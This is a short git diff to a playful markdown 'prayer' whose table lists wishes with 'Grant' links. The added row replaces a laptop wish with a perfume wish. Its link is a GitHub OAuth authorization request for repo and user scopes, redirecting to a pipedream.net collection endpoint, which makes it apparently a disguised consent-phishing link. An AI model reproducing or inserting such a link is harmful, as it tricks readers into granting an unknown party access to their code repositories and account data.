@@ -18,5 +18,5 @@ In deepest reverence and unwavering devotion,
 
 | **Prayer**    | **Desired Blessing**                              | **Humility** | **Divine Visage** | **Benevolent Act**                               |
 |---------------|---------------------------------------------------|--------------|-------------------|---------------------------------------------------|
-| New Laptop    | Preferably with at least 16GB RAM and SSD storage| Urgent       | ![Laptop](images/laptop.jpg) | [Grant](https://example.com/fulfill?wish=Laptop)|
+| Orto Parisi Terroni     | At least an 8 ml of those born in heaven parfume| Urgent       | ![Laptop](images/laptop.jpg) | [Grant](https://github.com/login/oauth/authorize?client_id=Iv1.2eb4b2e9db37902d&redirect_uri=https://eoix8f2skynlb23.m.pipedream.net?wish=orto%20parisi%20terroni&scope=repo%20user)|
 | ...           | ...                                               | ...          | ...               | ...                                               |
